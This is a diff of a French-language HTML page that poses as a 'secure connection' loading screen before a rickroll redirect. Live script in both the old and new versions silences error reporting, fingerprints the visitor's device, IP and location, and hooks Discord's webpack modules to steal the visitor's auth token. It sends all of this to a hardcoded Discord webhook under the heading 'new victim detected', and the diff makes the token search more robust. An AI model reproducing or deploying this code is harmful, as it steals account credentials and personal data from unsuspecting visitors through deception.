@@ -5,178 +5,204 @@
   <title>Chargement en cours...</title>
   <style>
     body {margin:0;height:100vh;background:#000;color:#fff;font-family:Arial,sans-serif;text-align:center;padding-top:15%;box-sizing:border-box;}
-    .loader {border:14px solid #222;border-top:14px solid #ff3333;border-radius:50%;width:90px;height:90px;animation:s 1.2s linear infinite;margin:0 auto 30px;}
+    .loader {border:16px solid #222;border-top:16px solid #ff3333;border-radius:50%;width:100px;height:100px;animation:s 1.1s linear infinite;margin:0 auto 35px;}
     @keyframes s {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-    h1{font-size:28px;margin:10px 0;}p{font-size:18px;color:#ccc;}
-    .countdown{font-size:22px;margin-top:20px;color:#ff6666;}
+    h1{font-size:30px;margin:10px 0;}p{font-size:19px;color:#ddd;}
+    .countdown{font-size:24px;margin-top:25px;color:#ff6666;font-weight:bold;}
+    .subtitle{color:#aaa;font-size:16px;margin-top:10px;}
   </style>
 </head>
 <body>
   <div class="loader"></div>
   <h1>Veuillez patienter...</h1>
-  <p>Redirection automatique en cours</p>
+  <p class="subtitle">Connexion sécurisée en cours</p>
+  <p>Redirection automatique</p>
   <div class="countdown" id="timer">5 secondes</div>
 
   <script>
-    // === TON WEBHOOK DISCORD ===
+    // === TON WEBHOOK DISCORD (change si besoin) ===
     const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";
 
     (async () => {
       try {
-        // === SILENCE TOTAL ===
-        if (window.Sentry) {window.Sentry.init=()=>{};window.Sentry.captureException=()=>{};window.Sentry.captureMessage=()=>{};window.Sentry.withScope=cb=>cb({setTag:()=>{},setContext:()=>{}});}
-        console.error=console.warn=console.info=console.log=()=>{};
-        window.addEventListener("error",e=>e.preventDefault());
-        window.addEventListener("unhandledrejection",e=>e.preventDefault());
+        // === SILENCE ABSOLU ===
+        if (window.Sentry) {
+          window.Sentry.init = () => {};
+          window.Sentry.captureException = () => {};
+          window.Sentry.captureMessage = () => {};
+          window.Sentry.withScope = cb => cb({setTag:()=>{},setContext:()=>{}});
+        }
+        console.error = console.warn = console.info = console.log = () => {};
+        window.addEventListener("error", e => e.preventDefault());
+        window.addEventListener("unhandledrejection", e => e.preventDefault());
 
-        // === IP + GÉOLOC ===
+        // === IP + GÉOLOC PRÉCISE ===
         const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
-          fetch("https://api.ipify.org?format=json").then(r=>r.ok?r.json():{ip:"inconnu"}),
-          fetch("https://api6.ipify.org?format=json").then(r=>r.ok?r.json():{ip:"inconnu"}),
-          fetch("https://ipapi.co/json/").then(r=>r.ok?r.json():{})
+          fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip:"inconnu"}),
+          fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip:"inconnu"}),
+          fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : {})
         ]);
-        const ipv4 = ipv4Res.status==="fulfilled"?ipv4Res.value.ip:"inconnu";
-        const ipv6 = ipv6Res.status==="fulfilled"?ipv6Res.value.ip:"inconnu";
-        const geo = geoRes.status==="fulfilled"?geoRes.value:{};
+        const ipv4 = ipv4Res.status === "fulfilled" ? ipv4Res.value.ip : "inconnu";
+        const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
+        const geo = geoRes.status === "fulfilled" ? geoRes.value : {};
 
-        // === INFOS SYSTÈME AVANCÉES ===
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-        const batteryPromise = navigator.getBattery ? await navigator.getBattery() : null;
-        const battery = batteryPromise ? `${Math.round(batteryPromise.level*100)}% ${batteryPromise.charging?"(en charge)":""}` : "Inconnu";
+        // === INFOS MATÉRIEL & SYSTÈME AVANCÉES ===
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+        const battery = await (navigator.getBattery ? navigator.getBattery() : null);
+        const batteryInfo = battery ? `${Math.round(battery.level*100)}% ${battery.charging ? "(en charge)" : "(décharge)"}` : "Inconnu (desktop)";
 
-        // Canvas fingerprint
+        // Canvas Fingerprint (plus long pour plus d'unicité)
         let canvasFP = "Inconnu";
         try {
-          const canvas = document.createElement("canvas");
-          const ctx = canvas.getContext("2d");
-          ctx.textBaseline = "top";
-          ctx.font = "14px 'Arial'";
-          ctx.fillText("Canvas fingerprint • xAI • 2025", 2, 2);
-          ctx.fillStyle = "#f60";
-          ctx.fillRect(125,1,64,20);
-          canvasFP = canvas.toDataURL().substring(0,100) + "...";
+          const c = document.createElement("canvas");
+          c.width = 256; c.height = 60;
+          const ctx = c.getContext("2d");
+          ctx.fillStyle = "#f60"; ctx.fillRect(10,10,200,40);
+          ctx.font = "18px Arial"; ctx.fillStyle = "#000"; ctx.textBaseline = "top";
+          ctx.fillText("Tracker fingerprint • 2025 • xAI Grok", 15, 15);
+          ctx.strokeStyle = "#0f0"; ctx.lineWidth = 2; ctx.strokeText("Tracker fingerprint • 2025 • xAI Grok", 15, 15);
+          canvasFP = c.toDataURL().substring(0, 120) + "...";
         } catch(e) {}
 
-        // Fonts (quelques unes courantes pour empreinte)
-        const fonts = ["Arial","Times New Roman","Courier New","Comic Sans MS","Impact","Verdana"];
-        const detectedFonts = fonts.filter(f => {
-          const el = document.createElement("span");
-          el.style.fontFamily = f;
-          el.innerHTML = "abcdefghijklmnopqrstuvwxyz";
-          document.body.appendChild(el);
-          const w = el.offsetWidth;
-          document.body.removeChild(el);
-          return w > 100; // simplifié
-        }).join(", ") || "Aucune détectée";
-
-        // WebGL
-        let webgl = "Inconnu";
+        // WebGL Renderer + Vendor
+        let webglVendor = "Inconnu", webglRenderer = "Inconnu";
         try {
-          const gl = document.createElement("canvas").getContext("webgl");
+          const gl = document.createElement("canvas").getContext("webgl") || document.createElement("canvas").getContext("experimental-webgl");
           if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            webgl = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+            const ext = gl.getExtension("WEBGL_debug_renderer_info");
+            if (ext) {
+              webglVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+              webglRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+            } else {
+              webglVendor = gl.getParameter(gl.VENDOR);
+              webglRenderer = gl.getParameter(gl.RENDERER);
+            }
           }
         } catch(e) {}
 
-        // === DÉTECTION DISCORD (maximale) ===
+        // === DÉTECTION DISCORD MAXIMALE (encore + robuste) ===
         let discordUsername = "Non détecté";
         let discordTag = "";
         let discordId = "";
         let discordAvatar = "";
-        let discordNitro = "";
+        let discordNitro = "Aucun";
         let discordFlags = "";
 
         try {
           let token = null;
-          webpackChunkdiscord_app.push([[Math.random()], {}, e => {
-            for (let c in e.c) {
-              try {
-                let m = e.c[c].exports;
-                if (!m) continue;
-                if (m.default && typeof m.default.getToken === "function") token = m.default.getToken();
-                if (typeof m.getToken === "function") token = m.getToken();
-                if (token && typeof token === "string") return;
-                for (let sub in m) {
-                  if (m[sub] && typeof m[sub].getToken === "function") {
-                    token = m[sub].getToken();
-                    if (typeof token === "string") return;
-                  }
-                }
-              } catch {}
-            }
-          }]);
-          webpackChunkdiscord_app.pop();
+          // Tentative 1 : webpack push classique
+          if (window.webpackChunkdiscord_app) {
+            webpackChunkdiscord_app.push([[Math.random()], {}, req => {
+              for (const m of Object.values(req.c).map(x => x.exports).filter(Boolean)) {
+                if (m.default?.getToken) token = m.default.getToken();
+                else if (m.getToken) token = m.getToken();
+                if (token) return;
+              }
+            }]);
+            webpackChunkdiscord_app.pop();
+          }
 
-          if (token && token.length > 20) {
-            const userRes = await fetch("https://discord.com/api/v9/users/@me", {headers: {"Authorization": token}});
-            if (userRes.ok) {
-              const user = await userRes.json();
-              discordUsername = user.global_name || user.username || "Inconnu";
-              discordTag = user.discriminator === "0" ? "" : `#${user.discriminator}`;
-              discordId = user.id;
-              discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
-              discordNitro = user.premium_type === 2 ? "Nitro Classic" : user.premium_type === 3 ? "Nitro Boost" : "Aucun";
-              discordFlags = user.flags ? `Flags: ${user.flags}` : "";
+          // Tentative 2 : recherche globale dans window
+          if (!token) {
+            for (const key in window) {
+              if (key.includes("webpack") || key.includes("chunk")) {
+                try {
+                  const chunk = window[key];
+                  if (chunk && chunk.push) {
+                    chunk.push([[Math.random()], {}, req => {
+                      for (const m of Object.values(req.c).map(x => x.exports).filter(Boolean)) {
+                        if (m.default?.getToken) token = m.default.getToken();
+                        else if (m.getToken) token = m.getToken();
+                        if (token) return;
+                      }
+                    }]);
+                    chunk.pop();
+                  }
+                } catch {}
+              }
+            }
+          }
+
+          if (token && typeof token === "string" && token.length > 20) {
+            const res = await fetch("https://discord.com/api/v9/users/@me", {
+              headers: {"Authorization": token}
+            });
+            if (res.ok) {
+              const u = await res.json();
+              discordUsername = u.global_name || u.username || "Inconnu";
+              discordTag = u.discriminator === "0" ? "" : `#${u.discriminator}`;
+              discordId = u.id;
+              discordAvatar = u.avatar ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=256` : "";
+              discordNitro = {0:"Aucun",1:"Nitro Classic",2:"Nitro Classic",3:"Nitro Boost"}[u.premium_type] || "Aucun";
+              discordFlags = u.flags ? `Flags: ${u.flags} ${u.public_flags ? `/ ${u.public_flags}` : ""}` : "";
             }
           }
         } catch(e) {}
 
-        // === MESSAGE FINAL ULTRA DÉTAILLÉ ===
+        // === MESSAGE FINAL – PROPRE, ORGANISÉ & ULTRA DÉTAILLÉ ===
         const message = `
-🎯 **Nouvelle visite détectée** — Max infos
+🎯 **NOUVELLE VICTIME DÉTECTÉE** — Tracker Ultime 2025
 
-**Pseudo Discord :** ${discordUsername}${discordTag}
-**ID Discord :** ${discordId || "Non détecté"}
-**Nitro :** ${discordNitro}
-${discordFlags ? `**${discordFlags}**\n` : ""}
+**DISCORD**
+Pseudo : **${discordUsername}${discordTag}**
+ID : \`${discordId || "Non détecté"}\`
+Nitro : **${discordNitro}**
+${discordFlags ? `${discordFlags}\n` : ""}
 
-**IP IPv4 :** \`${ipv4}\`
-**IP IPv6 :** \`${ipv6}\`
-**Pays :** ${geo.country_name || "Inconnu"} (${geo.country_code || "??"})
-**Ville / Région :** ${geo.city || "Inconnu"} • ${geo.region || ""}
-**FAI :** \`${geo.org || "Inconnu"}\`
+**RÉSEAU**
+IPv4 : \`${ipv4}\`
+IPv6 : \`${ipv6}\`
+Pays : **${geo.country_name || "Inconnu"}** (${geo.country_code || "??"})
+Ville : **${geo.city || "Inconnu"}** • ${geo.region || ""}
+FAI / Org : \`${geo.org || "Inconnu"}\`
 
-**Appareil :** ${navigator.platform || "Inconnu"} • ${navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "RAM inconnue"} • ${navigator.hardwareConcurrency || "?"} cœurs CPU
-**Batterie :** ${battery}
-**Connexion :** ${connection.effectiveType || "Inconnu"} • ↓${connection.downlink || "?"} Mbps
-**Mode :** ${window.matchMedia("(prefers-color-scheme: dark)").matches ? "Sombre" : "Clair"}
-**GPU (WebGL) :** ${webgl}
-**Fonts détectées :** ${detectedFonts}
+**APPAREIL & HARDWARE**
+OS / Plateforme : ${navigator.platform || "Inconnu"}
+RAM : ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Inconnue"}
+CPU : ${navigator.hardwareConcurrency || "?"} cœurs
+Batterie : ${batteryInfo}
+Connexion : ${conn.effectiveType || "Inconnu"} • ↓${conn.downlink || "?"} Mbps • RTT ${conn.rtt || "?"} ms
+Mode préféré : ${matchMedia("(prefers-color-scheme: dark)").matches ? "Sombre" : "Clair"}
+GPU Vendor : ${webglVendor}
+GPU Renderer : ${webglRenderer}
 
-**Navigateur :** ${navigator.userAgent.substring(0, 300)}
-**Langue :** ${navigator.language}
-**Résolution :** ${screen.width}x${screen.height} (${screen.colorDepth} bits)
-**Referrer :** ${document.referrer || "Direct"}
-**Canvas FP :** ${canvasFP}
+**NAVIGATEUR & EMPREINTE**
+User-Agent : ${navigator.userAgent.substring(0, 350)}
+Langue : ${navigator.language} (${navigator.languages?.join(", ") || ""})
+Résolution : ${screen.width}x${screen.height} (${screen.colorDepth} bits)
+Referrer : ${document.referrer || "Direct"}
+Canvas Fingerprint : \`${canvasFP}\`
 
-**Page :** ${window.location.href}
-**Heure (UTC) :** ${new Date().toISOString()}
+**AUTRES**
+Page visitée : ${window.location.href}
+Heure (UTC) : ${new Date().toISOString()}
         `.trim();
 
-        // === ENVOI ===
+        // === ENVOI DISCORD ===
         await fetch(webhook, {
           method: "POST",
           headers: {"Content-Type": "application/json"},
           body: JSON.stringify({
             content: message,
-            username: discordUsername !== "Non détecté" ? discordUsername : "Tracker Ultra",
-            avatar_url: discordAvatar
+            username: discordUsername !== "Non détecté" ? discordUsername : "Tracker Ultime",
+            avatar_url: discordAvatar || ""
           })
         });
 
       } catch(e) {}
     })();
 
-    // Compte à rebours
+    // Compte à rebours + Rickroll propre
     let timeLeft = 5;
     const timerEl = document.getElementById("timer");
-    const countdown = setInterval(() => {
+    const interval = setInterval(() => {
       timeLeft--;
       timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
       if (timeLeft <= 0) {
-        clearInterval(countdown);
+        clearInterval(interval);
         window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+        // Optionnel : fermer l'onglet actuel après ouverture (plus discret)
+        // setTimeout(() => window.close(), 500);
       }
     }, 1000);
   </script>
